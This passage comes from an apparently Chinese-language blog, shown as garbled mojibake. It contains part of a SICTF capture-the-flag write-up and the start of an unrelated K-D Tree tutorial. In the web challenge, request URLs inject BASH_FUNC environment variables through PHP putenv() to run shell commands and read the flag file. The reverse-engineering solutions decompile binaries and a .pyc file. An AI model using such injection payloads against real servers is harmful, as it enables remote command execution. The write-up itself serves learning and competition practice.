<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>] <span class="keyword">as</span> <span class="variable">$inject</span> =&gt; <span class="variable">$rce</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$inject&#125;</span>=<span class="subst">&#123;$rce&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo \&quot;Haven&#x27;t you get the secret?\&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>



<p>è¿™é‡Œæœ‰ä¸€ä¸ª<code>putenv()</code>å‡½æ•°ï¼Œæƒ³åˆ°ç¯å¢ƒå˜é‡æ³¨å…¥RCEï¼Œè¿™é‡Œæ¨èä¸€ä¸ªåšå®¢ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://www.ctfiot.com/26843.html">æˆ‘æ˜¯å¦‚ä½•åˆ©ç”¨ç¯å¢ƒå˜é‡æ³¨å…¥æ‰§è¡Œä»»æ„å‘½ä»¤ | CTFå¯¼èˆª (ctfiot.com)</a></p>
<p>æ„é€ payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://yuanshen.life:38932/?get[BASH_FUNC_echo%25%25]=()%20&#123;%20ls /;%20&#125;&amp;go=Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJXT1JSSUVTIjt9fXM6MzoieW91IjtOO30=</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20240218203506368.png" alt="image-20240218203506368"></p>
<p>æ‰¾åˆ°flagä½ç½®ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://yuanshen.life:38932/?get[BASH_FUNC_echo%25%25]=()%20&#123;%20cat /ffffllllllaaaaaaaaaaaaaaaaaaggggg;%20&#125;&amp;go=Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJXT1JSSUVTIjt9fXM6MzoieW91IjtOO30=</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20240218203552978.png" alt="image-20240218203552978"></p>
<p>å¾—åˆ°flagï¼šSICTF{37086214-58e2-4c16-a529-d543af5de128}</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h4 id="ç­¾åˆ°-Baby-C"><a href="#ç­¾åˆ°-Baby-C" class="headerlink" title="[ç­¾åˆ°]Baby_C++"></a>[ç­¾åˆ°]Baby_C++</h4><p>å¦‚é¢˜ï¼Œç­¾åˆ°é¢˜ã€‚</p>
<p>DIEæ‰“å¼€ï¼Œæ— å£³ï¼Œ64ä½ã€‚</p>
<p>ç”¨IDAæ‰“å¼€ï¼Œç›´æ¥shift+F12ï¼Œ</p>
<p><img src="/images/image-20240218204928370.png" alt="image-20240218204928370"></p>
<p>çœ‹åˆ°flagï¼šSICTF{4e474b8a-9df6-454b-9ea6-d4f5e37cd51f}</p>
<h4 id="Ez-pyc"><a href="#Ez-pyc" class="headerlink" title="Ez_pyc"></a>Ez_pyc</h4><p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ª.pycæ–‡ä»¶ï¼Œä½¿ç”¨uncompyle6åç¼–è¯‘å¾—åˆ°æºç ã€‚</p>
<p><img src="/images/image-20240218205656572.png" alt="image-20240218205656572"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 3.8 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.11.5 (tags/v3.11.5:cce6ba9, Aug 24 2023, 14:38:34) [MSC v.1936 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: E:\CTFèµ›é¢˜\ez_pyc\233.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2024-02-16 10:29:12</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 1218 bytes</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">k = [[<span class="string">&#x27;#&#x27;</span>] * <span class="number">10</span>,</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;#&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">9</span>] + [<span class="number">0</span>] * <span class="number">3</span> + [<span class="number">3</span>, <span class="number">0</span>, <span class="number">7</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;#&#x27;</span>, <span class="number">8</span>] + [<span class="number">0</span>] * <span class="number">8</span>,</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;#&#x27;</span>, <span class="number">4</span>] + [<span class="number">0</span>] * <span class="number">5</span> + [<span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;#&#x27;</span>] + [<span class="number">0</span>] * <span class="number">4</span> + [<span class="number">3</span>] + [<span class="number">0</span>] * <span class="number">4</span>,</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;#&#x27;</span>, <span class="number">5</span>] + [<span class="number">0</span>] * <span class="number">3</span> + [<span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;#&#x27;</span>, <span class="number">0</span>, <span class="number">7</span>] + [<span class="number">0</span>] * <span class="number">5</span> + [<span class="number">3</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;#&#x27;</span>] + [<span class="number">0</span>] * <span class="number">9</span>,</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;#&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;#&#x27;</span>] + [<span class="number">0</span>] * <span class="number">9</span>]</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">s = <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="built_in">input</span>(), <span class="number">16</span>))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">not</span> <span class="keyword">in</span> [<span class="built_in">str</span>(t) <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>)]:</span><br><span class="line">            s[cnt + <span class="number">43690</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(k)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(k[i])):</span><br><span class="line">                <span class="keyword">if</span> k[i][j] == <span class="number">0</span>:</span><br><span class="line">                    k[i][j] = <span class="built_in">int</span>(s[cnt])</span><br><span class="line">                    cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(k)):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(k)):</span><br><span class="line">                    <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> k[i]:</span><br><span class="line">                        s[cnt + <span class="number">3735928559</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(k)):</span><br><span class="line">                    tmp = []</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(k)):</span><br><span class="line">                        tmp.append(k[j][i])</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(k)):</span><br><span class="line">                        <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> tmp:</span><br><span class="line">                            s[cnt + <span class="number">3735928559</span>] = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(k), <span class="built_in">int</span>(<span class="built_in">len</span>(k) ** <span class="number">0.5</span>)):</span><br><span class="line">                            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(k), <span class="built_in">int</span>(<span class="built_in">len</span>(k) ** <span class="number">0.5</span>)):</span><br><span class="line">                                square = [k[x][y] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(i, i + <span class="number">3</span>) <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(j, j + <span class="number">3</span>)]</span><br><span class="line">                                <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(k)):</span><br><span class="line">                                    <span class="keyword">if</span> t <span class="keyword">not</span> <span class="keyword">in</span> tmp:</span><br><span class="line">                                        s[cnt + <span class="number">3735928559</span>] = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            m = hashlib.md5(s.encode()[::-<span class="number">1</span>]).hexdigest()</span><br><span class="line">                            <span class="keyword">if</span> m == <span class="string">&#x27;6baacb4d700007be9de5f94512b8a8c1&#x27;</span>:</span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">&#x27;SICTF&#123;%s&#125;&#x27;</span> % hashlib.md5(s.encode()).hexdigest())</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">&#x27;è¯•ç€æ¢ä¸€ç§è§£å˜qwq&#x27;</span>)</span><br><span class="line">                            <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        e = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">del</span> e</span><br></pre></td></tr></table></figure>

<p>å‘ç°è¿™æ˜¯ä¸€ä¸ªæ•°ç‹¬ï¼Œå…ˆè¾“å‡ºä¸€ä¸‹kã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[[&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], </span><br><span class="line">[&#x27;#&#x27;, 0, 1, 9, 0, 0, 0, 3, 0, 7], </span><br><span class="line">[&#x27;#&#x27;, 8, 0, 0, 0, 0, 0, 0, 0, 0], </span><br><span class="line">[&#x27;#&#x27;, 4, 0, 0, 0, 0, 0, 2, 0, 0], </span><br><span class="line">[&#x27;#&#x27;, 0, 0, 0, 0, 3, 0, 0, 0, 0], </span><br><span class="line">[&#x27;#&#x27;, 5, 0, 0, 0, 6, 0, 0, 2, 0], </span><br><span class="line">[&#x27;#&#x27;, 0, 7, 0, 0, 0, 0, 0, 3, 1], </span><br><span class="line">[&#x27;#&#x27;, 0, 0, 0, 0, 0, 0, 0, 0, 0], </span><br><span class="line">[&#x27;#&#x27;, 0, 0, 8, 0, 9, 0, 7, 0, 0], </span><br><span class="line">[&#x27;#&#x27;, 0, 0, 0, 0, 0, 0, 0, 0, 0]]</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå·æ‡’ï¼Œç”¨åœ¨çº¿ç½‘ç«™åšä¸€ä¸‹æ•°ç‹¬ã€‚</p>
<p><img src="/images/image-20240218210033146.png" alt="image-20240218210033146"></p>
<p>åˆ†æä¸€ä¸‹ä»£ç ï¼Œæˆ‘ä»¬çš„è§£æ˜¯æŒ‰é¡ºåºå¾€ç©ºæ ¼é‡Œå¡«çš„æ•°ï¼ˆå³ä»å·¦å¾€å³ï¼Œä»ä¸Šå¾€ä¸‹åº•è‰²éç»¿çš„æ•°å­—ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=2456835127469673891564192578837194925486324875196156342796214853</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„æœ€åè¿˜è¦md5åŠ å¯†ä¸€ä¸‹ã€‚</p>
<p>å¾—åˆ°flagï¼šSICTF{600d3294869ed3c6361f3fd22a672aa0}</p>
<h4 id="ArtBreaker"><a href="#ArtBreaker" class="headerlink" title="ArtBreaker"></a>ArtBreaker</h4><p>å¾ˆæœ‰è‰ºæœ¯æ„Ÿçš„ä¸€é“é¢˜ã€‚</p>
<p>ç”¨IDAæ‰“å¼€æ–‡ä»¶ã€‚</p>
<p><img src="/images/image-20240218215147076.png" alt="image-20240218215147076"></p>
<p>å¼¹å‡ºæ¥è¿™æ ·ä¸€ä¸ªæç¤ºï¼Œæ„æ€å°±æ˜¯æµç¨‹æ¡†å›¾çš„èŠ‚ç‚¹æ•°å¤ªå¤šäº†ï¼ˆæœ€å¤šæ˜¯10000ä¸ªï¼‰ï¼Œå¯ä»¥åœ¨é€‰é¡¹é‡Œé¢ä¿®æ”¹ä¸Šé™ã€‚</p>
<p>å¹³æ—¶åšé¢˜çš„æ—¶å€™æ²¡è§è¿‡è¿™ç§æƒ…å†µï¼Œè¯´æ˜è¿™é“é¢˜è‚¯å®šåœ¨æµç¨‹æ¡†å›¾é‡Œé¢åšæ–‡ç« äº†ï¼Œå› æ­¤æˆ‘ä»¬å»ä¿®æ”¹ä¸€ä¸‹ä¸Šé™ï¼Œæƒ³åŠæ³•å»çœ‹çœ‹æµç¨‹æ¡†å›¾ã€‚</p>
<p><img src="/images/image-20240218215347871.png" alt="image-20240218215347871"></p>
<p><img src="/images/image-20240218215407431.png" alt="image-20240218215407431"></p>
<p>æ‰¾åˆ°Options-&gt;General-&gt;Max number of nodes</p>
<p>æ”¹æˆä¸€ä¸ªå¤§ç‚¹çš„æ•°å­—ã€‚æ¥ä¸‹æ¥å°±èƒ½çœ‹æµç¨‹æ¡†å›¾äº†ã€‚ï¼ˆå³é”®ï¼Œé€‰æ‹©Graph Viewï¼‰</p>
<p><img src="/images/image-20240218215523833.png" alt="image-20240218215523833"></p>
<p>çœ‹åˆ°ä¸€å †è¿™æ ·çš„æ’åˆ—ï¼Œæˆ‘ä»¬ç»§ç»­ç¼©å°è§†è§’ã€‚</p>
<p><img src="/images/image-20240218215608645.png" alt="image-20240218215608645"></p>
<p>ç¼©å°åˆ°ä¸€å®šç¨‹åº¦æ—¶çœ‹åˆ°flagï¼šSICTF{Rabbit_falls_into_rabbit_hole}</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://jasmineaura.github.io/2023/11/03/K-d-Tree%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="JasmineAura">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="JasmineAura's Blog">
      <meta itemprop="description" content="It's just a matter of time">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | JasmineAura's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/11/03/K-d-Tree%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/" class="post-title-link" itemprop="url">K-D Treeä»å…¥é—¨åˆ°ç²¾é€š</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>

      <time title="åˆ›å»ºæ—¶é—´ï¼š2023-11-03 19:49:40" itemprop="dateCreated datePublished" datetime="2023-11-03T19:49:40+08:00">2023-11-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">æ›´æ–°äº</span>
      <time title="ä¿®æ”¹æ—¶é—´ï¼š2024-02-22 22:10:04" itemprop="dateModified" datetime="2024-02-22T22:10:04+08:00">2024-02-22</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="K-D-TreeåŸºç¡€"><a href="#K-D-TreeåŸºç¡€" class="headerlink" title="K-D TreeåŸºç¡€"></a>K-D TreeåŸºç¡€</h2><h3 id="ä»€ä¹ˆæ˜¯K-D-Treeï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯K-D-Treeï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯K-D Treeï¼Ÿ"></a>ä»€ä¹ˆæ˜¯K-D Treeï¼Ÿ</h3><p>k-D Tree(KDT , k-Dimension Tree) æ˜¯ä¸€ç§å¯ä»¥ <strong>é«˜æ•ˆå¤„ç† $k$ ç»´ç©ºé—´ä¿¡æ¯</strong> çš„æ•°æ®ç»“æ„ï¼Œå¸¸ç”¨äº <strong>é¢†åŸŸæŸ¥è¯¢ï¼Œæœ€è¿‘ç‚¹å¯¹æŸ¥è¯¢</strong> ç­‰æ“ä½œã€‚</p>
<p>k-D Treeå…·æœ‰äºŒå‰æœç´¢æ ‘çš„å½¢æ€ï¼Œå…¶æ¯ä¸ªèŠ‚ç‚¹éƒ½å¯¹åº” $k$ ç»´ç©ºé—´å†…çš„ä¸€ä¸ªç‚¹ã€‚</p>
<p>åœ¨é¢˜ç›®ä¸­ï¼Œä¸€èˆ¬ $k&#x3D;2$ã€‚</p>
<h3 id="èŠ‚ç‚¹ä¿¡æ¯å‚¨å­˜"><a href="#èŠ‚ç‚¹ä¿¡æ¯å‚¨å­˜" class="headerlink" title="èŠ‚ç‚¹ä¿¡æ¯å‚¨å­˜"></a>èŠ‚ç‚¹ä¿¡æ¯å‚¨å­˜</h3><p>æˆ‘ä»¬é€šå¸¸ç”¨ä¸€ä¸ªç»“æ„ä½“å‚¨å­˜k-D Treeæ‰€æœ‰èŠ‚ç‚¹çš„ä¿¡æ¯</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å‡è®¾ç»´æŠ¤çš„æ˜¯Kç»´çš„ç©ºé—´ä¿¡æ¯</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> d[K];<span class="comment">//d[i]è¡¨ç¤ºç¬¬i+1ç»´çš„åæ ‡ï¼ˆå› ä¸ºä¸‹æ ‡ä»0å¼€å§‹ï¼‰</span></span><br><span class="line">    <span class="type">int</span> mx[K],mn[K];<span class="comment">//mx[i]å’Œmn[i]è¡¨ç¤ºè¯¥èŠ‚ç‚¹æ‰€ç®¡è¾–çš„ç¬¬i+1ç»´åæ ‡æå€¼,æ¯”è¾ƒå…³é”®ï¼Œåé¢ä¼šè®²</span></span><br><span class="line">    <span class="type">int</span> ls,rs;<span class="comment">//å·¦å³å„¿å­</span></span><br><span class="line">	<span class="type">int</span> val;<span class="comment">//èŠ‚ç‚¹æƒå€¼ï¼Œå¯èƒ½ä¼šç”¨åˆ°</span></span><br><span class="line">    <span class="type">int</span> sum;<span class="comment">//èŠ‚ç‚¹å­æ ‘çš„æƒå€¼å’Œï¼Œå¯èƒ½ä¼šç”¨åˆ°</span></span><br><span class="line">&#125;t[MAX],ori[MAX];<span class="comment">//tä¸ºk-D Treeæ‰€ä½¿ç”¨çš„æ•°ç»„</span></span><br></pre></td></tr></table></figure>



<h3 id="å»ºæ ‘"><a href="#å»ºæ ‘" class="headerlink" title="å»ºæ ‘"></a>å»ºæ ‘</h3><p>k-D Treeå¸¸è§çš„å»ºæ ‘æ–¹å¼æœ‰ä¸¤ç§ï¼š<strong>äº¤æ›¿å»ºæ ‘</strong>ï¼Œ<strong>æ–¹å·®å»ºæ ‘</strong>ã€‚</p>
<p><em>äº¤æ›¿å»ºæ ‘ä»£ç å®ç°ç®€å•ï¼Œå®¹æ˜“è®°å¿†ï¼Œè€Œæ–¹å·®å»ºæ ‘è¾ƒä¸ºå¤æ‚ï¼Œç”¨çš„è¾ƒå°‘ï¼Œæ•…è¿™é‡Œåªä»‹ç»äº¤æ›¿å»ºæ ‘çš„æ–¹æ³•</em>ã€‚</p>
<h4 id="äº¤æ›¿å»ºæ ‘"><a href="#äº¤æ›¿å»ºæ ‘" class="headerlink" title="äº¤æ›¿å»ºæ ‘"></a>äº¤æ›¿å»ºæ ‘</h4><p>äº¤æ›¿å»ºæ ‘æœ‰ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p>
<ol>
<li>å°†å½“å‰ç‚¹é›†çš„æ‰€æœ‰ç‚¹æŒ‰ç¬¬ $d$ ç»´æ’åºï¼Œå–å‡ºä¸­ä½æ•°ã€‚</li>
<li>å°†å–å‡ºçš„ä¸­ä½æ•°ä½œä¸ºå½“å‰ç‚¹é›†çš„æ ¹èŠ‚ç‚¹ï¼Œå‰©ä½™çš„ç‚¹é›†åˆ†åˆ«ä½œä¸ºè¯¥ç‚¹çš„å·¦å­æ ‘å’Œå³å­æ ‘ã€‚</li>
<li>é‡å¤ä»¥ä¸Šä¸¤ä¸ªæ­¥éª¤ï¼Œæ¯æ¬¡ $d$ è¦æ”¹æˆ $d+1$ï¼Œå¦‚æœ $d+1\gt k$ ï¼Œåˆ™ $d&#x3D;1$ï¼ˆå…¶ä¸­ $k$ ä¸ºæ‰€æœ‰ç‚¹çš„ç»´åº¦ï¼‰ï¼Œç›´åˆ°æ‰€æœ‰æ ‘ä¸Šçš„æ‰€æœ‰ç‚¹éƒ½ç¡®å®šã€‚</li>
</ol>
<p>æœ‰ç‚¹æŠ½è±¡ï¼Ÿä¸æ€•ï¼ä¸¾ä¸ªä¾‹å­å°±æ‡‚äº†ï¼</p>
<p>ç»™å‡º $7$ ä¸ª $2$ ç»´ç©ºé—´çš„ç‚¹ï¼Œåˆ†åˆ«ä¸º $(1,4),(2,5),(1,5),(2,3),(3,1),(4,1),(3,4)$ã€‚</p>
<p>é¦–å…ˆæŒ‰ç¬¬ $1$ ç»´æ’åºï¼Œå¾—åˆ°çš„ç‚¹é›†æ˜¯ $(1,4),(1,5),(2,5),(2,3),(3,1),(3,4),(4,1)$ã€‚</p>
<p>å–å‡ºä¸­ä½æ•° $(2,3)$ï¼Œä½œä¸ºå½“å‰ç‚¹é›†çš„æ ¹èŠ‚ç‚¹ï¼Œå‰©ä½™çš„ç‚¹é›†åˆ†åˆ«ä½œä¸ºå·¦å­æ ‘å’Œå³å­æ ‘ï¼Œå¦‚å›¾ï¼š</p>
<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/6k89z0tk.png"></p>
<p>å¯¹äºå‰©ä¸‹çš„ä¸¤ä¸ªç‚¹é›†ï¼Œæˆ‘ä»¬ç»§ç»­å»ºæ ‘ï¼Œæ­¤æ—¶æˆ‘ä»¬è¦å¯¹ç¬¬ $2$ ç»´æ’åºã€‚</p>
<p>ç„¶åå¾—åˆ°ä¸¤ä¸ªç‚¹é›†ï¼Œ$(1,4),(1,5),(2,5)$ å’Œ $(3,1),(4,1),(3,4)$ã€‚</p>
<p>åˆ†åˆ«å–å‡ºä¸­ä½æ•° $(1,5)$ å’Œ $(4,1)$ ä½œä¸ºä¸¤ä¸ªç‚¹é›†çš„æ ¹èŠ‚ç‚¹ï¼Œå‰©ä½™çš„ç‚¹é›†ç»§ç»­å»ºæ ‘ï¼Œæœ€åå¾—åˆ°çš„æ ‘å¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/d067mp1y.png"></p>
<p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±é€šè¿‡ <strong>äº¤æ›¿å»ºæ ‘</strong> çš„æ–¹å¼å¾—åˆ°äº†ä¸€é¢—å±‚æ•°ä¸º $\log n$ çš„ k-D Treeã€‚</p>
<p>è¿™ä¸€è¿‡ç¨‹å¯ä»¥ç”¨ä¸€ä¸ªå¹³é¢ç›´è§’åæ ‡ç³»æ¥è¡¨ç¤ºï¼š</p>
<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/vg4wjqu5.png"></p>
<p>æ‰¾ä¸­ä½æ•°æ˜¯ä¸ªæ¯”è¾ƒæ£˜æ‰‹çš„äº‹æƒ…ï¼Œæˆ‘ä»¬å½“ç„¶å¯ä»¥ä½¿ç”¨ <code>sort()</code> æ’åºï¼Œç„¶åæ‰¾åˆ°ä½ç½®ä¸º mid çš„å…ƒç´ ï¼Œä½†æ˜¯è¿™æ ·çš„æ—¶é—´å¤æ‚åº¦æ˜¯ $O(n\log n)$ã€‚</p>
<p>æˆ‘ä»¬å…¶å®è¿˜å¯ä»¥ä½¿ç”¨è¿™æ ·ä¸€ä¸ªå‡½æ•° <code>nth_element()</code> ï¼Œå°† <code>l</code> å’Œ <code>r</code> ä¹‹é—´çš„æ•°æŒ‰ç…§æ¯”è¾ƒè§„åˆ™ <code>cmp</code> æ’åºåï¼Œä½ç½®ä¸º <code>mid</code> çš„å…ƒç´ å°±æ˜¯ä¸­ä½æ•°ï¼Œåƒè¿™æ · <code>nth_element(ori+l,ori+mid,ori+r+1,cmp)</code>ã€‚è¿™æ ·çš„æ—¶é—´å¤æ‚åº¦æ˜¯ $O(\log n)$ã€‚</p>
<p>k-D Treeå»ºæ ‘æ•´ä½“çš„å¤æ‚åº¦æ˜¯ $O(n\log n)$ã€‚</p>
<p>ä»£ç å®ç°ï¼š</p>
